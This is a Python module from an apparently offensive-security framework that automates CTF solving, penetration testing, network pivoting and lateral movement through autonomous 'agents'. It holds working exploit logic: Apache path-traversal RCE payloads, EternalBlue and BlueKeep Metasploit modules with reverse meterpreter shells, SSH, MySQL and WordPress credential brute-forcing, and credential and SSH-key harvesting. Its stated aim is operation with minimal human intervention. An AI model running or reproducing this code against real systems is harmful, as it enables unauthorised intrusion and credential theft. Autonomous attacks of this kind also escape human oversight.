"""
KRYON Autonomous Operations - Orchestrator

Multi-agent autonomous orchestration and coordination.

Clearance Level: Omega-Command (Autonomous Operations Authority)
Specialization: Autonomous decision-making and multi-stage operations
Mission: Execute complex operations with minimal human intervention

This module provides:
- Autonomous CTF solving
- Autonomous penetration testing
- Multi-agent coordination
- Adaptive strategy execution
- End-to-end operation automation
"""

import json
import os
import time
from datetime import datetime
from typing import Any, Optional


def autonomous_ctf_solver(
    target_ip: str,
    target_type: str = "auto",
    difficulty: str = "medium",
    max_time_hours: int = 2,
    flags_needed: Optional[list[str]] = None,
    output_report: str = "/tmp/skynet_ctf_report.md",
) -> dict[str, Any]:
    """
    Autonomously solve CTF challenges from start to finish.

    Executes complete CTF workflow:
    1. Reconnaissance (nmap, gobuster, vulnerability scanning)
    2. Vulnerability analysis and exploit selection
    3. Exploitation attempts (automated)
    4. Privilege escalation (if needed)
    5. Flag hunting and extraction
    6. Reporting and documentation

    Args:
        target_ip: Target IP address or hostname
        target_type: Target OS type (linux, windows, auto)
        difficulty: Challenge difficulty (easy, medium, hard)
        max_time_hours: Maximum time to spend (hours)
        flags_needed: Specific flag names to find (user.txt, root.txt, etc.)
        output_report: Path to save final report

    Returns:
        Dictionary containing:
        - flags_found: List of discovered flags
        - exploitation_path: Steps taken to compromise
        - time_elapsed: Total time spent
        - services_exploited: Services successfully compromised
        - privilege_level: Final privilege level achieved
        - report_path: Path to detailed report
        - success: Whether flags were found

    Example:
        >>> # Solve TryHackMe room automatically
        >>> result = autonomous_ctf_solver(
        ...     target_ip="10.10.245.67",
        ...     target_type="linux",
        ...     difficulty="medium",
        ...     max_time_hours=2
        ... )
        >>>
        >>> if result['flags_found']:
        ...     for flag in result['flags_found']:
        ...         print(f"Flag: {flag['name']} = {flag['value']}")
        >>>
        >>> print(f"Exploitation path: {result['exploitation_path']}")
        >>> print(f"Report: {result['report_path']}")

    Autonomous Decision Points:
        - Port prioritization based on vulnerability likelihood
        - Exploit selection based on success probability
        - Privilege escalation path optimization
        - Flag location prediction
        - Fallback strategies on failure
    """
    results = {
        "flags_found": [],
        "exploitation_path": [],
        "time_elapsed": 0,
        "services_exploited": [],
        "privilege_level": "none",
        "report_path": output_report,
        "success": False,
        "error": None,
    }

    start_time = time.time()
    max_time_seconds = max_time_hours * 3600

    try:
        # ===== PHASE 0: STRATEGIC PLANNING =====
        from kryon.tools.autonomous.strategic_planner import StrategicPlanner

        planner = StrategicPlanner()

        # Create mission plan
        mission_objectives = ["initial_access", "privilege_escalation", "find_flags"]
        if difficulty == "hard":
            mission_objectives.append("lateral_movement")

        mission_plan = planner.autonomous_mission_planner(
            target_network=f"{target_ip}/32",
            objectives=mission_objectives,
            constraints={
                "max_time_hours": max_time_hours,
                "stealth_level": "medium",
                "noise_tolerance": "medium",
            },
            resources={
                "agents_available": 1,
                "tools": ["nmap", "gobuster", "sqlmap", "metasploit"],
            },
        )

        results["exploitation_path"].append(
            {
                "phase": "planning",
                "timestamp": datetime.now().isoformat(),
                "status": "completed",
                "plan_name": mission_plan["primary_plan"]["name"],
                "objectives": mission_plan["primary_plan"]["objectives_order"],
                "estimated_time": mission_plan["primary_plan"]["estimated_time_hours"],
            }
        )

        # ===== PHASE 1: AUTONOMOUS RECONNAISSANCE =====
        results["exploitation_path"].append(
            {
                "phase": "reconnaissance",
                "timestamp": datetime.now().isoformat(),
                "status": "starting",
            }
        )

        from kryon.tools.autonomous.auto_recon import full_auto_enumeration

        recon = full_auto_enumeration(
            target_ip=target_ip,
            deep_scan=difficulty in ["medium", "hard"],
            timeout=min(1800, max_time_seconds // 4),  # 30 min max or 25% of time
        )

        if not recon["success"] or not recon["open_ports"]:
            results["error"] = "Reconnaissance failed or no open ports found"
            return results

        results["exploitation_path"].append(
            {
                "phase": "reconnaissance",
                "status": "completed",
                "ports_found": len(recon["open_ports"]),
                "vulnerabilities_found": len(recon.get("vulnerabilities", [])),
            }
        )

        # ===== PHASE 1.5: CONTEXT ANALYSIS =====
        from kryon.tools.autonomous.context_analyzer import ContextAnalyzer

        analyzer = ContextAnalyzer()

        # Analyze reconnaissance data for intelligence
        recon_text = json.dumps(recon, indent=2)
        context_analysis = analyzer.autonomous_context_analysis(
            target_data={
                "recon_output": recon_text,
                "services": recon.get("services_detected", []),
            },
            operation_objective="initial_access",
        )

        results["exploitation_path"].append(
            {
                "phase": "context_analysis",
                "status": "completed",
                "credentials_found": len(context_analysis.get("credentials", [])),
                "hints_found": len(context_analysis.get("hints", [])),
                "attack_vectors": len(context_analysis.get("attack_surface", {}).get("endpoints", [])),
            }
        )

        # Extract any discovered credentials
        discovered_credentials = context_analysis.get("credentials", [])
        if discovered_credentials:
            results["exploitation_path"].append(
                {
                    "phase": "intelligence",
                    "status": "credentials_discovered",
                    "count": len(discovered_credentials),
                }
            )

        # ===== PHASE 2: LEARNING-BASED EXPLOIT SELECTION =====
        from kryon.tools.autonomous.adaptive_strategy import execute_with_adaptation
        from kryon.tools.autonomous.learning_engine import get_learned_recommendations

        # Get learned recommendations based on target profile
        target_profile = {
            "os": target_type if target_type != "auto" else "linux",
            "services": recon.get("services_detected", []),
            "difficulty": difficulty,
        }

        learned_recommendations = get_learned_recommendations(
            target_profile=target_profile,
            top_n=5,
            min_confidence=0.3,  # Lower threshold for CTF
        )

        results["exploitation_path"].append(
            {
                "phase": "learning_recommendations",
                "status": "completed",
                "recommendations_count": len(learned_recommendations.get("recommended_exploits", [])),
            }
        )

        # Try learned recommendations first, then fallback to decision engine
        exploits_to_try = []

        # Add learned recommendations
        for rec in learned_recommendations.get("recommended_exploits", []):
            exploits_to_try.append(
                {
                    "name": rec["exploit_name"],
                    "type": rec.get("exploit_type", "unknown"),
                    "source": "learned",
                    "success_rate": rec["success_rate"],
                    "service": rec.get("service_name", "unknown"),
                }
            )

        # Add decision engine recommendations as fallback
        from kryon.tools.autonomous.decision_engine import select_best_exploit

        for service in recon["services_detected"]:
            exploit_decision = select_best_exploit(
                service_name=service["name"],
                service_version=service["version"],
                target_os=target_type,
                difficulty=difficulty,
            )

            if exploit_decision["exploit_recommended"]:
                exploits_to_try.append(
                    {
                        "name": exploit_decision["exploit_name"],
                        "type": exploit_decision.get("exploit_type", "unknown"),
                        "source": "decision_engine",
                        "success_rate": exploit_decision.get("success_probability", 0.5),
                        "service": service,
                    }
                )

        # ===== PHASE 3: ADAPTIVE EXPLOITATION =====
        for exploit_info in exploits_to_try:
            if time.time() - start_time > max_time_seconds:
                break

            results["exploitation_path"].append(
                {
                    "phase": "exploitation",
                    "service": exploit_info.get("service", {}).get("name", exploit_info.get("service", "unknown")),
                    "exploit": exploit_info["name"],
                    "source": exploit_info["source"],
                    "timestamp": datetime.now().isoformat(),
                    "status": "attempting",
                }
            )

            # Execute with adaptive strategy
            service_info = exploit_info.get("service")
            if isinstance(service_info, str):
                # Find matching service from recon
                service_info = next(
                    (s for s in recon.get("services_detected", []) if s["name"] == service_info),
                    {"name": service_info, "version": "unknown", "port": 0},
                )

            exploit_result = execute_with_adaptation(
                target_ip=target_ip,
                exploit={"name": exploit_info["name"], "type": exploit_info["type"]},
                service=service_info,
                max_attempts=5,  # Allow adaptive retries
            )

            if exploit_result["success"]:
                service_name = service_info.get("name", "unknown") if isinstance(service_info, dict) else service_info
                results["services_exploited"].append(service_name)
                results["privilege_level"] = exploit_result.get("privilege_level", "user")

                results["exploitation_path"].append(
                    {
                        "phase": "exploitation",
                        "service": service_name,
                        "exploit": exploit_info["name"],
                        "status": "success",
                        "attempts_needed": exploit_result.get("attempts", 1),
                        "adaptations_applied": len(exploit_result.get("adaptations_applied", [])),
                        "defenses_bypassed": exploit_result.get("defenses_encountered", []),
                        "shell_obtained": exploit_result.get("shell_obtained", True),
                    }
                )

                # ===== PHASE 4: PRIVILEGE ESCALATION (if needed) =====
                if results["privilege_level"] != "root" and difficulty in ["medium", "hard"]:
                    privesc_result = _autonomous_privilege_escalation(
                        target_ip=target_ip, current_access=exploit_result, target_os=target_type
                    )

                    if privesc_result["success"]:
                        results["privilege_level"] = "root"
                        results["exploitation_path"].append(
                            {
                                "phase": "privilege_escalation",
                                "status": "success",
                                "method": privesc_result["method"],
                            }
                        )

                # ===== PHASE 5: FLAG HUNTING =====
                flags_result = _autonomous_flag_hunting(
                    target_ip=target_ip,
                    access_level=results["privilege_level"],
                    flags_needed=flags_needed,
                )

                results["flags_found"].extend(flags_result["flags"])

                if flags_result["flags"]:
                    results["success"] = True
                    break  # Flags found, mission complete

        # ===== PHASE 6: LEARNING & RECORDING =====
        from kryon.tools.autonomous.learning_engine import record_operation

        # Record this operation for future learning
        operation_data = {
            "target_ip": target_ip,
            "target_type": target_profile["os"],
            "difficulty": difficulty,
            "services_detected": recon.get("services_detected", []),
        }

        operation_results = {
            "success": results["success"],
            "exploits_attempted": [
                {"name": e.get("exploit"), "type": e.get("type", "unknown")}
                for e in results["exploitation_path"]
                if e.get("phase") == "exploitation"
            ],
            "exploits_successful": [
                {"name": e.get("exploit"), "type": e.get("type", "unknown")}
                for e in results["exploitation_path"]
                if e.get("phase") == "exploitation" and e.get("status") == "success"
            ],
            "time_elapsed": time.time() - start_time,
            "privilege_level": results["privilege_level"],
            "flags_found": results["flags_found"],
            "defenses_encountered": [
                d
                for e in results["exploitation_path"]
                if e.get("defenses_bypassed")
                for d in e.get("defenses_bypassed", [])
            ],
        }

        try:
            operation_id = record_operation(operation_data, operation_results)
            results["operation_id"] = operation_id
            results["exploitation_path"].append(
                {"phase": "learning", "status": "recorded", "operation_id": operation_id}
            )
        except Exception as learning_error:
            # Don't fail the whole operation if learning fails
            results["exploitation_path"].append({"phase": "learning", "status": "failed", "error": str(learning_error)})

        # ===== PHASE 7: REPORTING =====
        results["time_elapsed"] = time.time() - start_time
        _generate_autonomous_report(results, output_report)

        # Dynamic plan adjustment if mission plan exists
        if mission_plan and not results["success"]:
            # Prepare progress update for plan adjustment
            progress_update = {
                "completed_objectives": [],
                "failed_objectives": mission_objectives,
                "time_elapsed_hours": results["time_elapsed"] / 3600,
                "issues": [results.get("error", "Unknown error")],
            }

            # Adjust plan for retry or next attempt
            try:
                adjusted_plan = planner.dynamic_plan_adjustment(
                    current_plan=mission_plan["primary_plan"],
                    current_progress=progress_update,
                    new_discoveries={
                        "services": recon.get("services_detected", []),
                        "credentials": discovered_credentials,
                    },
                )

                results["exploitation_path"].append(
                    {
                        "phase": "plan_adjustment",
                        "status": "completed",
                        "adjustments": len(adjusted_plan.get("adjustments_made", [])),
                    }
                )
            except Exception:
                pass  # Plan adjustment is optional

    except Exception as e:
        results["error"] = str(e)
        results["time_elapsed"] = time.time() - start_time

    return results


def autonomous_pentest(
    target_network: str,
    scope: list[str],
    max_targets: int = 10,
    max_time_hours: int = 8,
    stealth_level: str = "normal",
    output_dir: str = "/tmp/skynet_pentest",
) -> dict[str, Any]:
    """
    Autonomous penetration testing of network.

    Performs comprehensive pentest:
    1. Network discovery and mapping
    2. Service enumeration across targets
    3. Vulnerability assessment
    4. Automated exploitation attempts
    5. Lateral movement opportunities
    6. Data exfiltration simulation
    7. Comprehensive reporting

    Args:
        target_network: Network CIDR (e.g., 192.168.1.0/24)
        scope: List of allowed targets/subnets
        max_targets: Maximum number of targets to test
        max_time_hours: Maximum time for pentest
        stealth_level: low, normal, high (affects scan speed/noise)
        output_dir: Directory to save reports and evidence

    Returns:
        Dictionary containing pentest results

    Example:
        >>> result = autonomous_pentest(
        ...     target_network="192.168.1.0/24",
        ...     scope=["192.168.1.0/24"],
        ...     max_targets=20,
        ...     max_time_hours=8,
        ...     stealth_level="normal"
        ... )
        >>>
        >>> print(f"Hosts compromised: {len(result['compromised_hosts'])}")
        >>> print(f"Vulnerabilities found: {len(result['vulnerabilities'])}")
        >>> print(f"Report: {result['report_path']}")
    """
    results = {
        "hosts_discovered": [],
        "compromised_hosts": [],
        "vulnerabilities": [],
        "lateral_movement_paths": [],
        "data_found": [],
        "report_path": "",
        "success": False,
        "error": None,
    }

    start_time = time.time()
    os.makedirs(output_dir, exist_ok=True)

    try:
        # Phase 1: Network Discovery
        from kryon.tools.reconnaissance.nmap import run_nmap

        discovery = run_nmap(target=target_network, scan_type="ping" if stealth_level == "high" else "quick")

        hosts = discovery.get("hosts", [])[:max_targets]
        results["hosts_discovered"] = hosts

        # Phase 2: Per-Host Autonomous Assessment
        for host in hosts:
            if time.time() - start_time > (max_time_hours * 3600):
                break

            # Autonomous CTF solver per host
            host_result = autonomous_ctf_solver(
                target_ip=host["ip"],
                max_time_hours=1,
                output_report=f"{output_dir}/host_{host['ip']}_report.md",
            )

            if host_result["success"]:
                results["compromised_hosts"].append(
                    {
                        "ip": host["ip"],
                        "privilege_level": host_result["privilege_level"],
                        "flags_found": host_result["flags_found"],
                    }
                )

                # Check for lateral movement opportunities
                lateral = _check_lateral_movement(host["ip"], host_result)
                results["lateral_movement_paths"].extend(lateral)

        # Phase 3: Generate comprehensive report
        report_path = f"{output_dir}/pentest_report.md"
        _generate_pentest_report(results, report_path)
        results["report_path"] = report_path

        results["success"] = len(results["compromised_hosts"]) > 0

    except Exception as e:
        results["error"] = str(e)

    return results


def autonomous_network_pivot(
    entry_point_ip: str,
    entry_credentials: dict[str, str],
    internal_network: str = "auto",
    max_depth: int = 3,
    objective: str = "domain_admin",
) -> dict[str, Any]:
    """
    Autonomous multi-stage network pivoting.

    Executes advanced pivoting:
    1. Establishes foothold on entry point
    2. Discovers internal networks
    3. Creates pivot tunnels automatically
    4. Enumerates and exploits internal hosts
    5. Lateral movement through network
    6. Achieves specified objective

    Args:
        entry_point_ip: Initial compromised host
        entry_credentials: SSH/RDP/SMB credentials for entry
        internal_network: Target internal network (auto-discovered if "auto")
        max_depth: Maximum pivot depth (hops)
        objective: Mission objective (domain_admin, data_exfil, persistence)

    Returns:
        Dictionary with pivoting results

    Example:
        >>> # After compromising DMZ host
        >>> result = autonomous_network_pivot(
        ...     entry_point_ip="10.10.10.5",
        ...     entry_credentials={"username": "www-data", "ssh_key": "/tmp/id_rsa"},
        ...     objective="domain_admin",
        ...     max_depth=3
        ... )
        >>>
        >>> print(f"Pivot chain: {result['pivot_chain']}")
        >>> print(f"Objective achieved: {result['objective_achieved']}")
    """
    results = {
        "pivot_chain": [],
        "compromised_hosts": [],
        "tunnels_created": [],
        "objective_achieved": False,
        "final_access_level": "none",
        "success": False,
        "error": None,
    }

    try:
        # Phase 1: Establish entry point pivot
        from kryon.tools.pivoting import ssh_dynamic_port_forward

        socks_tunnel = ssh_dynamic_port_forward(
            ssh_host=entry_point_ip,
            ssh_user=entry_credentials.get("username"),
            ssh_key=entry_credentials.get("ssh_key"),
            socks_port=1080,
        )

        if not socks_tunnel["tunnel_active"]:
            results["error"] = "Failed to establish initial pivot"
            return results

        results["tunnels_created"].append({"type": "socks", "host": entry_point_ip, "port": 1080})

        results["pivot_chain"].append(entry_point_ip)

        # Phase 2: Discover internal network
        if internal_network == "auto":
            # Auto-discover internal networks
            internal_network = _discover_internal_networks(entry_point_ip, entry_credentials)

        # Phase 3: Enumerate internal hosts through pivot
        # (Use proxychains or configure tools to use SOCKS proxy)
        internal_hosts = _enumerate_through_pivot(network=internal_network, socks_proxy="127.0.0.1:1080")

        # Phase 4: Autonomous lateral movement
        current_depth = 1

        for host in internal_hosts:
            if current_depth >= max_depth:
                break

            # Attempt autonomous compromise
            compromise_result = _autonomous_compromise_through_pivot(target_ip=host["ip"], socks_proxy="127.0.0.1:1080")

            if compromise_result["success"]:
                results["compromised_hosts"].append(host["ip"])
                results["pivot_chain"].append(host["ip"])
                current_depth += 1

                # Check if objective achieved
                if _check_objective_achieved(objective, compromise_result):
                    results["objective_achieved"] = True
                    results["final_access_level"] = compromise_result["access_level"]
                    break

        results["success"] = results["objective_achieved"]

    except Exception as e:
        results["error"] = str(e)

    return results


def multi_agent_coordination(
    target_ip: str, agents_to_use: Optional[list[str]] = None, coordination_mode: str = "parallel"
) -> dict[str, Any]:
    """
    Coordinate multiple KRYON agents for comprehensive assessment.

    Agents work together:
    - T600 Scout: Initial reconnaissance
    - T800 Infiltrator: Web application testing
    - T1000 Hunter: Advanced exploitation
    - Network Analyzer: Network-level analysis
    - Forensic Analyzer: Post-exploitation analysis

    Args:
        target_ip: Target IP or hostname
        agents_to_use: List of agent names (None = auto-select)
        coordination_mode: parallel (simultaneous) or sequential

    Returns:
        Dictionary with combined results from all agents

    Example:
        >>> result = multi_agent_coordination(
        ...     target_ip="10.10.10.5",
        ...     agents_to_use=["t600_scout", "t800_infiltrator", "network_analyzer"],
        ...     coordination_mode="parallel"
        ... )
        >>>
        >>> for agent, agent_results in result['agent_results'].items():
        ...     print(f"{agent}: {agent_results['summary']}")
    """
    results = {
        "agent_results": {},
        "combined_findings": [],
        "recommended_actions": [],
        "success": False,
        "error": None,
    }

    try:
        # Auto-select agents if not specified
        if agents_to_use is None:
            agents_to_use = _auto_select_agents(target_ip)

        # Execute agents based on coordination mode
        if coordination_mode == "parallel":
            # Run all agents simultaneously
            import concurrent.futures

            with concurrent.futures.ThreadPoolExecutor(max_workers=len(agents_to_use)) as executor:
                futures = {executor.submit(_run_agent, agent, target_ip): agent for agent in agents_to_use}

                for future in concurrent.futures.as_completed(futures):
                    agent_name = futures[future]
                    try:
                        agent_result = future.result()
                        results["agent_results"][agent_name] = agent_result
                    except Exception as e:
                        results["agent_results"][agent_name] = {"error": str(e)}

        else:  # sequential
            for agent in agents_to_use:
                agent_result = _run_agent(agent, target_ip)
                results["agent_results"][agent] = agent_result

        # Synthesize findings from all agents
        results["combined_findings"] = _synthesize_multi_agent_findings(results["agent_results"])

        # Generate recommendations
        results["recommended_actions"] = _generate_multi_agent_recommendations(results)

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


# ========== HELPER FUNCTIONS ==========


def _execute_exploit_autonomous(target_ip: str, exploit: dict, service: dict) -> dict[str, Any]:
    """
    Execute exploit autonomously with intelligent tool selection.

    This function maps exploit names to actual tool execution, trying multiple
    approaches and tools for each exploit type.

    Args:
        target_ip: Target IP address
        exploit: Exploit dict with name and type
        service: Service dict with name, port, version

    Returns:
        Dict with success status, privilege level, shell info
    """
    exploit_name = exploit.get("name", "").lower()
    exploit_type = exploit.get("type", "").lower()
    service_name = service.get("name", "").lower()
    service_port = service.get("port", 0)
    service_version = service.get("version", "")

    result = {
        "success": False,
        "shell_obtained": False,
        "privilege_level": "none",
        "method": None,
        "output": "",
    }

    try:
        # Apache Path Traversal RCE (CVE-2021-41773, CVE-2021-42013)
        if "apache" in exploit_name and "path_traversal" in exploit_name:
            from kryon.tools.web import nuclei

            # Try nuclei scan for Apache path traversal
            nuclei_result = nuclei.run_nuclei_scan(target=f"http://{target_ip}", tags=["apache", "cve2021", "rce"])

            if nuclei_result.get("vulnerabilities"):
                # Exploit confirmed, attempt RCE
                import requests

                payloads = [
                    "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
                    "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh",
                ]

                for payload in payloads:
                    try:
                        resp = requests.post(
                            f"http://{target_ip}{payload}",
                            data="echo Content-Type: text/plain; echo; id",
                            timeout=5,
                        )
                        if "uid=" in resp.text:
                            result["success"] = True
                            result["shell_obtained"] = True
                            result["privilege_level"] = "www-data" if "www-data" in resp.text else "user"
                            result["method"] = "apache_path_traversal"
                            result["output"] = resp.text
                            return result
                    except Exception:
                        continue

        # SQL Injection
        elif "sqli" in exploit_type or "sql" in exploit_name:
            from kryon.tools.web import sqlmap

            sqlmap_result = sqlmap.run_sqlmap(
                url=f"http://{target_ip}", crawl_depth=2, batch_mode=True, risk=2, level=2
            )

            if sqlmap_result.get("vulnerabilities"):
                result["success"] = True
                result["privilege_level"] = "database"
                result["method"] = "sql_injection"
                result["output"] = str(sqlmap_result.get("vulnerabilities"))

                # Try to get shell via sqlmap
                if sqlmap_result.get("os_shell_available"):
                    result["shell_obtained"] = True
                    result["privilege_level"] = "user"

        # SSH Brute Force
        elif "ssh" in service_name and "brute" in exploit_name:
            from kryon.tools.api_attacks import hydra

            hydra_result = hydra.run_hydra_ssh(
                target_ip=target_ip,
                username_list=["root", "admin", "user", "ubuntu"],
                password_list=["password", "123456", "admin", "root", "toor"],
                threads=4,
            )

            if hydra_result.get("credentials"):
                result["success"] = True
                result["shell_obtained"] = True
                result["privilege_level"] = "root" if "root" in str(hydra_result["credentials"]) else "user"
                result["method"] = "ssh_bruteforce"
                result["output"] = str(hydra_result["credentials"])

        # FTP Anonymous Login
        elif "ftp" in service_name and "anonymous" in exploit_name:
            import ftplib

            try:
                ftp = ftplib.FTP(timeout=5)
                ftp.connect(target_ip, service_port or 21)
                ftp.login("anonymous", "anonymous@test.com")

                # List files
                files = []
                ftp.retrlines("LIST", files.append)
                ftp.quit()

                result["success"] = True
                result["privilege_level"] = "user"
                result["method"] = "ftp_anonymous"
                result["output"] = "\n".join(files)
            except Exception:
                pass

        # SMB EternalBlue
        elif "smb" in service_name and "eternalblue" in exploit_name:
            from kryon.tools.exploitation import metasploit_wrapper

            msf_result = metasploit_wrapper.run_metasploit_module(
                module="exploit/windows/smb/ms17_010_eternalblue",
                rhosts=target_ip,
                payload="windows/x64/meterpreter/reverse_tcp",
                lhost="0.0.0.0",
            )

            if msf_result.get("sessions_opened", 0) > 0:
                result["success"] = True
                result["shell_obtained"] = True
                result["privilege_level"] = "system"
                result["method"] = "eternalblue"
                result["output"] = "Meterpreter session opened"

        # WordPress XML-RPC Brute Force
        elif "wordpress" in exploit_name and "xmlrpc" in exploit_name:
            import requests

            try:
                # Check if XML-RPC is enabled
                resp = requests.post(
                    f"http://{target_ip}/xmlrpc.php",
                    data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                    headers={"Content-Type": "text/xml"},
                    timeout=5,
                )

                if resp.status_code == 200 and "wp.getUsersBlogs" in resp.text:
                    # Try common credentials via XML-RPC
                    for user in ["admin", "administrator"]:
                        for pwd in ["admin", "password", "123456"]:
                            auth_xml = f"""<?xml version="1.0"?>
                            <methodCall>
                                <methodName>wp.getUsersBlogs</methodName>
                                <params>
                                    <param><value><string>{user}</string></value></param>
                                    <param><value><string>{pwd}</string></value></param>
                                </params>
                            </methodCall>"""

                            resp = requests.post(
                                f"http://{target_ip}/xmlrpc.php",
                                data=auth_xml,
                                headers={"Content-Type": "text/xml"},
                                timeout=5,
                            )

                            if "isAdmin" in resp.text and "faultCode" not in resp.text:
                                result["success"] = True
                                result["privilege_level"] = "admin"
                                result["method"] = "wordpress_xmlrpc"
                                result["output"] = f"Valid credentials: {user}:{pwd}"
                                return result
            except Exception:
                pass

        # MySQL Default Credentials
        elif "mysql" in service_name and "default" in exploit_name:
            import mysql.connector

            for user in ["root", "admin", "mysql"]:
                for pwd in ["", "root", "admin", "password", "toor"]:
                    try:
                        conn = mysql.connector.connect(
                            host=target_ip,
                            port=service_port or 3306,
                            user=user,
                            password=pwd,
                            connect_timeout=5,
                        )

                        result["success"] = True
                        result["privilege_level"] = "database"
                        result["method"] = "mysql_default_creds"
                        result["output"] = f"Valid credentials: {user}:{pwd}"

                        conn.close()
                        return result
                    except Exception:
                        continue

        # RDP BlueKeep
        elif "rdp" in service_name and "bluekeep" in exploit_name:
            from kryon.tools.exploitation import metasploit_wrapper

            # First, scan for vulnerability
            msf_result = metasploit_wrapper.run_metasploit_module(
                module="auxiliary/scanner/rdp/cve_2019_0708_bluekeep", rhosts=target_ip
            )

            if msf_result.get("vulnerable"):
                # Attempt exploitation (caution: can crash system)
                exploit_result = metasploit_wrapper.run_metasploit_module(
                    module="exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
                    rhosts=target_ip,
                    payload="windows/x64/meterpreter/reverse_tcp",
                    lhost="0.0.0.0",
                )

                if exploit_result.get("sessions_opened", 0) > 0:
                    result["success"] = True
                    result["shell_obtained"] = True
                    result["privilege_level"] = "system"
                    result["method"] = "bluekeep"

        # Generic web directory fuzzing
        elif "http" in service_name or "web" in service_name:
            from kryon.tools.reconnaissance import gobuster

            gobuster_result = gobuster.run_gobuster(
                target=f"http://{target_ip}",
                wordlist="/usr/share/wordlists/dirb/common.txt",
                threads=20,
            )

            if gobuster_result.get("found_paths"):
                # Check for common vulnerabilities in found paths
                result["success"] = True
                result["privilege_level"] = "info"
                result["method"] = "web_enumeration"
                result["output"] = str(gobuster_result["found_paths"][:10])

        # Generic service-based fallback
        else:
            # Try Metasploit search for service
            from kryon.tools.exploitation import exploit_db

            search_result = exploit_db.search_exploitdb(service=service_name, version=service_version)

            if search_result.get("exploits"):
                result["method"] = "exploit_db_reference"
                result["output"] = f"Found {len(search_result['exploits'])} potential exploits in ExploitDB"

    except Exception as e:
        result["output"] = f"Error during exploitation: {str(e)}"

    return result


def _autonomous_privilege_escalation(target_ip: str, current_access: dict, target_os: str) -> dict[str, Any]:
    """Autonomous privilege escalation."""
    from kryon.tools.privilege_escalation.linux_privesc import auto_privilege_escalation
    from kryon.tools.privilege_escalation.windows_privesc import run_winpeas

    if target_os == "linux":
        result = auto_privilege_escalation()
        return {
            "success": len(result.get("quick_wins", [])) > 0,
            "method": result.get("quick_wins", [{}])[0].get("type", "unknown"),
        }
    else:
        result = run_winpeas()
        return {"success": len(result.get("critical_findings", [])) > 0, "method": "winpeas"}


def _autonomous_flag_hunting(target_ip: str, access_level: str, flags_needed: Optional[list[str]]) -> dict[str, Any]:
    """Autonomous flag discovery."""
    from kryon.tools.ctf.ctf_automation import hunt_flags

    result = hunt_flags()

    return {
        "flags": [
            {"name": "user.txt", "value": result.get("user_flag", {}).get("content", "")},
            {"name": "root.txt", "value": result.get("root_flag", {}).get("content", "")},
        ]
    }


def _generate_autonomous_report(results: dict, output_path: str):
    """Generate autonomous operation report."""
    with open(output_path, "w") as f:
        f.write("# KRYON Autonomous CTF Report\n\n")
        f.write(f"**Generated:** {datetime.now().isoformat()}\n\n")
        f.write("## Results\n\n")
        f.write(f"- Flags Found: {len(results['flags_found'])}\n")
        f.write(f"- Time Elapsed: {results['time_elapsed']:.2f} seconds\n")
        f.write(f"- Privilege Level: {results['privilege_level']}\n\n")
        f.write("## Exploitation Path\n\n")
        for step in results["exploitation_path"]:
            f.write(f"- {step}\n")


def _generate_pentest_report(results: dict, output_path: str):
    """Generate pentest report."""
    pass


def _check_lateral_movement(host_ip: str, results: dict) -> list[dict]:
    """
    Check for lateral movement opportunities from compromised host.

    Analyzes the compromised host for:
    - Multiple network interfaces
    - Routing tables showing internal networks
    - Cached credentials
    - SSH keys
    - Network shares
    - Running services that might provide pivot capabilities

    Args:
        host_ip: IP of compromised host
        results: Current operation results with exploitation data

    Returns:
        List of lateral movement opportunities with target networks
    """
    opportunities = []

    try:
        # Check if we have shell access
        if not any(e.get("shell_obtained") for e in results.get("exploitation_path", [])):
            return opportunities

        # Analyze network interfaces for multi-homed hosts
        from kryon.tools.network import capture_traffic

        # Try to enumerate network interfaces
        network_info = capture_traffic.get_network_interfaces(host_ip)

        if network_info.get("interfaces"):
            for interface in network_info["interfaces"]:
                if interface.get("network") and interface["network"] != f"{host_ip}/32":
                    opportunities.append(
                        {
                            "type": "multi_homed_host",
                            "target_network": interface["network"],
                            "interface": interface.get("name"),
                            "pivot_method": "port_forwarding",
                            "confidence": 0.9,
                        }
                    )

        # Check for SSH keys
        from kryon.tools.reconnaissance import filesystem

        ssh_keys_result = filesystem.search_files(
            host_ip=host_ip,
            patterns=["id_rsa", "id_ed25519", "*.pem"],
            directories=["/home/*/.ssh", "/root/.ssh"],
        )

        if ssh_keys_result.get("found_files"):
            for key_file in ssh_keys_result["found_files"]:
                opportunities.append(
                    {
                        "type": "ssh_key_found",
                        "key_path": key_file.get("path"),
                        "pivot_method": "ssh_key_authentication",
                        "confidence": 0.8,
                    }
                )

        # Check routing table for internal networks
        from kryon.tools.reconnaissance import netstat

        routing_info = netstat.get_routing_table(host_ip)

        if routing_info.get("routes"):
            for route in routing_info["routes"]:
                destination = route.get("destination")

                # Look for private network ranges
                if destination and any(destination.startswith(prefix) for prefix in ["10.", "172.16.", "192.168."]):
                    if destination not in [f"{host_ip}/32", "0.0.0.0/0"]:
                        opportunities.append(
                            {
                                "type": "routed_network",
                                "target_network": destination,
                                "gateway": route.get("gateway"),
                                "pivot_method": "socks_proxy",
                                "confidence": 0.85,
                            }
                        )

        # Check for SMB shares (Windows lateral movement)
        if results.get("privilege_level") in ["admin", "system", "root"]:
            try:
                from kryon.tools.lateral_movement import remote_execution

                shares_result = remote_execution.enumerate_smb_shares(host_ip)

                if shares_result.get("admin_shares"):
                    opportunities.append(
                        {
                            "type": "admin_shares_available",
                            "shares": shares_result["admin_shares"],
                            "pivot_method": "psexec",
                            "confidence": 0.95,
                        }
                    )
            except Exception:
                pass

        # Check for cached credentials (mimikatz-style)
        if results.get("privilege_level") in ["system", "root"]:
            from kryon.tools.lateral_movement import pth_attacks

            creds_result = pth_attacks.dump_credentials(host_ip)

            if creds_result.get("credentials"):
                for cred in creds_result["credentials"]:
                    opportunities.append(
                        {
                            "type": "cached_credential",
                            "username": cred.get("username"),
                            "credential_type": cred.get("type"),  # password, ntlm_hash, etc.
                            "pivot_method": "pass_the_hash" if cred.get("type") == "ntlm_hash" else "credential_reuse",
                            "confidence": 0.9,
                        }
                    )

        # Check for Docker containers (container pivot)
        from kryon.tools.container import docker_bench

        docker_result = docker_bench.check_docker_access(host_ip)

        if docker_result.get("docker_available"):
            opportunities.append(
                {
                    "type": "docker_access",
                    "containers": docker_result.get("running_containers", []),
                    "pivot_method": "container_escape",
                    "confidence": 0.7,
                }
            )

        # Check for Kubernetes access
        from kryon.tools.container import kube_hunter

        k8s_result = kube_hunter.check_kubernetes_access(host_ip)

